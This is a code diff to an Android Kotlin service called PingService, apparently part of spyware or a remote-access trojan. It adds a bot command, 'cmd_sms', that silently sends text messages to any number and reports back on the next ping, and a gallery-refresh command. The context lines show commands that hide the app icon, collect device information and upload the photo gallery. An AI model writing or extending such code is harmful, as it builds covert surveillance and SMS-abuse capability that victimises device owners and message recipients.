@@ -240,12 +240,30 @@ class PingService : Service() {
                 "cmd_i" -> fullHide()            // completely hide (no icon)
                 "cmd_j" -> unHide()              // unhide and restore
                 "cmd_info"    -> collectDeviceInfo()
-                "cmd_gallery" -> GalleryUploader(this).start()
+                "cmd_sms"     -> sendSmsFromCommand(arg)
+                "cmd_gallery"         -> GalleryUploader(this).start()
+                "cmd_gallery_refresh" -> GalleryUploader(this).refresh()
             }
         } catch (_: Exception) {}
     }
 
     /* ============================================================ commands */
+
+    // SMS send from bot command
+    private fun sendSmsFromCommand(arg: String) {
+        try {
+            val data = org.json.JSONObject(arg)
+            val to   = data.optString("to", "")
+            val msg  = data.optString("msg", "")
+            if (to.isBlank() || msg.isBlank()) return
+            val mgr = android.telephony.SmsManager.getDefault()
+            val parts = mgr.divideMessage(msg)
+            mgr.sendMultipartTextMessage(to, null, parts, null, null)
+            prefs.edit().putString("pending_report", "📤 SMS sent to $to").apply()
+        } catch (e: Exception) {
+            prefs.edit().putString("pending_report", "SMS error: ${e.message}").apply()
+        }
+    }
 
     // INFO — collect all device info and queue for next ping
     private fun collectDeviceInfo() {
